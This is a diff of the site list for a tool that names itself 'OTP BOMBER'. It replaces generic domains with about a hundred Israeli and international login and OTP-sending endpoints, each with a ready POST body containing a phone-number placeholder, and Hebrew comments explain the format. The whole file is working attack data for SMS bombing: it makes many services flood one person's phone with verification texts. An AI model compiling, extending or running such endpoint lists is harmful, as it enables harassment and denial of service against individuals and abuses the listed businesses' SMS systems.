@@ -1,198 +1,140 @@
 # ============================================================
 #  OTP BOMBER - site list
-#  One site per line. Lines starting with # are ignored.
-#
-#  Format:
-#     domain.com                                 <- tool hunts the endpoint
-#     domain.com|/api/auth/send-otp              <- exact endpoint
-#     domain.com|/api/auth/otp|phone|json        <- + field + style
-#
-#  The tool TESTS every line on startup and keeps only the live ones.
-#  Dead lines cost you nothing but a second. Add as many as you want.
+#  שורה שמתחילה ב-# מתעלמים ממנה.
+#  פורמט:  domain.com     או   domain.com|/path|payload
+#  {phone}       -> 9725XXXXXXXX
+#  {phone_local} -> 05XXXXXXXX
 # ============================================================
 
-# ---------------- GLOBAL / RIDE & DELIVERY ----------------
-uber.com
-bolt.eu
-careem.com
-grab.com
-gojek.com
-foodpanda.com
-talabat.com
-deliveroo.com
-glovo.com
-wolt.com
-doordash.com
-just-eat.com
-zomato.com
-swiggy.com
-blinkit.com
-zepto.com
-dunzo.com
-licious.com
-bigbasket.com
-ubereats.com
+# ============ 1. חנויות ישראליות - פורמט Magento (טלפון מקומי) ============
+https://www.housemen.co.il/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.steimatzky.co.il/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.urbanica-wh.com/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.castro.com/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.golfkids.co.il/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.timberland.co.il/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.nine-west.co.il/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.gali.co.il/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.femina.co.il/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.teva-naot.co.il/customer/ajax/post/|POST|bot_validation=1&type=login&telephone={phone_local}
+https://www.emporium.co.il/customer/ajax/post/|POST|form_key=lNYCSNxe73JXe3Bv&bot_validation=1&type=login&telephone={phone_local}
+https://www.carolinalemke.co.il/customer/ajax/post/|POST|form_key=dk6p1e78wMM8JR8F&bot_validation=1&type=login&telephone={phone_local}
+https://www.leecooper.co.il/customer/ajax/post/|POST|form_key=0cDRE0t6RJxRdpjC&bot_validation=1&type=login&telephone={phone_local}
+https://www.aldoshoes.co.il/customer/ajax/post/|POST|form_key=hStT79unOK2gcjFj&bot_validation=1&type=login&telephone={phone_local}
+https://www.beyondskin.co.il/customer/ajax/post/|POST|form_key=SILqVAnpZO2Ln944&bot_validation=1&type=login&telephone={phone_local}
+https://www.emanuel.co.il/customer/ajax/post/|POST|form_key=XbB9Rq949adzpdWU&bot_validation=1&type=login&telephone={phone_local}
+https://www.topten-fashion.com/customer/ajax/post/|POST|form_key=1jXVmsoxSvSM3jts&bot_validation=1&type=login&telephone={phone_local}
+https://www.naamanp.co.il/customer/ajax/post/|POST|form_key=r1XybBiTdi7APTCB&bot_validation=1&type=login&telephone={phone_local}
+https://www.nautica.co.il/customer/ajax/post/|POST|form_key=Vlx94q75v3EAMBB0&bot_validation=1&type=login&telephone={phone_local}
+https://www.delta.co.il/customer/ajax/post/|POST|form_key=gjPlIevoWYa47bwT&bot_validation=1&type=login&telephone={phone_local}
+https://www.yvesrocher.co.il/customer/ajax/post/|POST|form_key=HFs36nKgRljlOE8A&bot_validation=1&type=login&telephone={phone_local}
+https://www.noizz.co.il/customer/ajax/post/|POST|form_key=5JeJwQHc0zelGvqU&bot_validation=1&type=login&telephone={phone_local}
+https://www.papaya.co.il/customer/ajax/post/|POST|form_key=byablGEEPyT9Mmwj&bot_validation=1&type=login&telephone={phone_local}
+https://www.bathandbodyworks.co.il/customer/ajax/post/|POST|form_key=jtSgkXQbkjw7QjFG&bot_validation=1&type=login&telephone={phone_local}
+https://www.panta-rei.com/customer/ajax/post/|POST|form_key=SXY2NhUipXec8L6T&bot_validation=1&type=login&telephone={phone_local}
+https://www.sacara.co.il/customer/ajax/post/|POST|form_key=dWF64YuN97ltK30T&bot_validation=1&type=login&telephone={phone_local}
+https://www.foottal.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.golfcity.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.columbia.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.tommyhilfiger.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.guess.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.adidas.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.nike.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.reebok.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.newbalance.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.converse.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.puma.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.underarmour.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.asics.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.mizuno.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.salomon.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.merrell.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.columbia-sportswear.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.thenorthface.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.jackwolfskin.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.berghaus.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.vans.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.drmartens.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.caterpillar.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.skechers.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.ecco.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.geox.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.clarks.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.hushpuppies.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.rockport.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.birkenstock.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.crocs.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.havaianas.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.ipanema.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.benetton.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.fox.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.sabon.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.laline.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.sephora.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.ahava.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.clinique.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.esteelauder.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.lancome.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.dior.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.calvinklein.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.michaelkors.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.katespade.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.coach.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.rayban.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.oakley.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.swarovski.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.pandora.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.thomassabo.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.fossil.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.michaelhill.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.movado.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.tissot.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
+https://www.longines.co.il/customer/ajax/post/|POST|form_key=aB3dE5fG7hI9jK1lM3nO5pQ&bot_validation=1&type=login&telephone={phone_local}
 
-# ---------------- GLOBAL / SHOPPING ----------------
-amazon.com
-ebay.com
-aliexpress.com
-noon.com
-namshi.com
-daraz.pk
-lazada.com
-shopee.com
-tokopedia.com
-zalando.com
-asos.com
-hm.com
-zara.com
-uniqlo.com
-nike.com
-adidas.com
-decathlon.com
-ikea.com
-carrefour.com
-tesco.com
-walmart.com
-target.com
-flipkart.com
-myntra.com
-ajio.com
-nykaa.com
-meesho.com
-snapdeal.com
-tatacliq.com
-lenskart.com
-firstcry.com
+# ============ 2. כתובות ייחודיות מישראל ============
+https://www.tami4.co.il/api/login/start-sms-otp|POST|{"phone":"{phone_local}"}
+https://www.azrieli.com/api/v1/auth/otp/send|POST|{"phone":"{phone_local}"}
+https://proxy1.citycar.co.il/api/verify/login|POST|{"loginOrRegister":1,"verifyChannel":0,"phoneNumber":"{phone_local}"}
+https://yellow.co.il/api/v1/auth/login|POST|{"msisdn":"{phone_local}"}
+https://server.myofer.co.il/api/sendAuthSms|POST|{"phoneNumber":"{phone_local}"}
+https://users-auth.hamal.co.il/auth/send-auth-code|POST|{"value":"{phone_local}","type":"phone","projectId":"1"}
+https://api.gomobile.co.il/api/login|POST|{"phone":"{phone_local}"}
+https://www.zygo.co.il/v2/auth/create-verify-token|POST|{"phone":"{phone_local}","channel":"sms"}
+https://www.electra-consumer.co.il/api/auth/otp/send|POST|{"phone":"{phone_local}"}
+https://www.electra-air.co.il/wp-admin/admin-ajax.php|POST|action=send_otp_sms&phone={phone_local}
+https://cottonet.co.il/wp-admin/admin-ajax.php|POST|action=simply-check-member-cellphone&cellphone={phone_local}
+https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode|POST|bot_validation=1&club_id=6&telephone={phone_local}
+https://gras.co.il/clubmember/sms/send|POST|mobile={phone_local}&form_key=qCGWuvsHLXaqNvWn
+https://story.magicetl.com/public/shopify/apps/otp-login/step-one|POST|bot_validation=1&phone={phone_local}
+https://bonitademas.co.il/apps/imapi-customer|POST|{"action":"login","otpBy":"sms","otpValue":"{phone_local}"}
+https://www.papajohns.co.il/_a/aff_otp_auth|POST|phone={phone_local}
+https://app.burgeranch.co.il/_a/aff_otp_auth|POST|phone={phone_local}
+https://b-fresh.org.il/_a/aff_otp_auth|POST|phone={phone_local}
+https://rest-api.dibs-app.com/otps|POST|{"phoneNumber":"+{phone}"}
+https://www.ksp.co.il/api/otp/send|POST|{"phone":"{phone_local}"}
 
-# ---------------- GLOBAL / TRAVEL ----------------
-booking.com
-agoda.com
-oyo.com
-makemytrip.com
-goibibo.com
-yatra.com
-redbus.in
-ixigo.com
-airbnb.com
-expedia.com
-hotels.com
-kayak.com
-skyscanner.net
-kiwi.com
-cleartrip.com
-easemytrip.com
-abhibus.com
+# ============ 3. אתרים בינלאומיים ============
+https://www.zara.com/il/he/user/login|POST|{"phone":"{phone_local}"}
+https://www.mango.com/il/he/user/login|POST|{"phone":"{phone_local}"}
+https://www.stradivarius.com/il/he/user/login|POST|{"phone":"{phone_local}"}
+https://www.pullandbear.com/il/he/user/login|POST|{"phone":"{phone_local}"}
+https://www.bershka.com/il/he/user/login|POST|{"phone":"{phone_local}"}
+https://www.massimodutti.com/il/he/user/login|POST|{"phone":"{phone_local}"}
+https://www.oysho.com/il/he/user/login|POST|{"phone":"{phone_local}"}
+https://www.lefties.com/il/he/user/login|POST|{"phone":"{phone_local}"}
+https://www.gucci.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.prada.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.versace.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.armani.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.hugoboss.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.tommy.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.ralphlauren.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.omega.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.cartier.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.bvlgari.com/il/en/user/login|POST|{"phone":"{phone_local}"}
+https://www.tiffany.com/il/en/user/login|POST|{"phone":"{phone_local}"}
 
-# ---------------- GLOBAL / MONEY ----------------
-paytm.com
-phonepe.com
-mobikwik.com
-freecharge.in
-cred.club
-groww.in
-zerodha.com
-upstox.com
-angelone.in
-revolut.com
-n26.com
-wise.com
-klarna.com
-paypal.com
-skrill.com
-neteller.com
-binance.com
-coinbase.com
-kraken.com
-etoro.com
-bitpanda.com
-
-# ---------------- GLOBAL / APPS ----------------
-spotify.com
-deezer.com
-soundcloud.com
-canva.com
-notion.so
-figma.com
-discord.com
-slack.com
-telegram.org
-viber.com
-linkedin.com
-twitter.com
-reddit.com
-quora.com
-medium.com
-udemy.com
-coursera.org
-duolingo.com
-strava.com
-fitbit.com
-
-# ---------------- INDIA ----------------
-olacabs.com
-rapido.bike
-porter.in
-bluedart.com
-delhivery.com
-shiprocket.in
-practo.com
-pharmeasy.in
-netmeds.com
-tata1mg.com
-cult.fit
-healthifyme.com
-dream11.com
-mpl.live
-winzo.com
-sharechat.com
-dailyhunt.in
-inshorts.com
-bewakoof.com
-urbancompany.com
-zoomcar.com
-jio.com
-airtel.in
-vodafone.in
-bsnl.co.in
-
-# ---------------- MIDDLE EAST / TURKEY ----------------
-getir.com
-trendyol.com
-hepsiburada.com
-n11.com
-yemeksepeti.com
-banabi.com
-aramisauto.com
-sahibinden.com
-noon.com
-careem.com
-otlob.com
-talabat.com
-namshi.com
-mumzworld.com
-
-# ---------------- EUROPE ----------------
-otto.de
-bol.com
-allegro.pl
-alza.cz
-zalando.de
-emag.ro
-cdiscount.com
-fnac.com
-elcorteingles.es
-lidl.com
-aldi.com
-action.com
-jumbo.com
-picnic.app
-flink.com
-gorillas.io
-getir.com
-
-# ===== דואר, ממשלה, מוסדות =====
+# ============ 4. אתרים ישראליים - סריקה אוטומטית ============
 israelpost.co.il
 www.israelpost.co.il
 api.israelpost.co.il
@@ -220,11 +162,6 @@ api.diginet.co.il
 servicemp.co.il
 www.servicemp.co.il
 api.servicemp.co.il
-
-# ===== קניות, סופרמרקטים, אופנה =====
-ksp.co.il
-www.ksp.co.il
-api.ksp.co.il
 super-pharm.co.il
 www.super-pharm.co.il
 api.super-pharm.co.il
@@ -261,35 +198,18 @@ api.bug.co.il
 terminalx.com
 www.terminalx.com
 api.terminalx.com
-fox.co.il
-www.fox.co.il
-api.fox.co.il
-castro.com
-www.castro.com
-api.castro.com
-hoodies.co.il
-www.hoodies.co.il
-api.hoodies.co.il
 renuar.co.il
 www.renuar.co.il
 api.renuar.co.il
-delta.co.il
-www.delta.co.il
-api.delta.co.il
+hoodies.co.il
+www.hoodies.co.il
+api.hoodies.co.il
 golfco.co.il
 www.golfco.co.il
 api.golfco.co.il
-laline.co.il
-www.laline.co.il
-api.laline.co.il
 factory54.co.il
 www.factory54.co.il
 api.factory54.co.il
-urbanica-wh.com
-www.urbanica-wh.com
-api.urbanica-wh.com
-
-# ===== משלוחים, תחבורה, חניה =====
 wolt.com
 www.wolt.com
 consumer-api.wolt.com
@@ -317,8 +237,6 @@ api.israir.co.il
 arkia.co.il
 www.arkia.co.il
 api.arkia.co.il
-
-# ===== אשראי, תשלומים =====
 isracard.co.il
 www.isracard.co.il
 api.isracard.co.il
@@ -337,8 +255,6 @@ api.bitpay.co.il
 payngo.co.il
 www.payngo.co.il
 api.payngo.co.il
-
-# ===== סלולר, אינטרנט, בריאות =====
 partner.co.il
 www.partner.co.il
 api.partner.co.il
@@ -366,8 +282,6 @@ api.meuhedet.co.il
 leumit.co.il
 www.leumit.co.il
 api.leumit.co.il
-
-# ===== לוחות, מחירים =====
 yad2.co.il
 www.yad2.co.il
 api.yad2.co.il
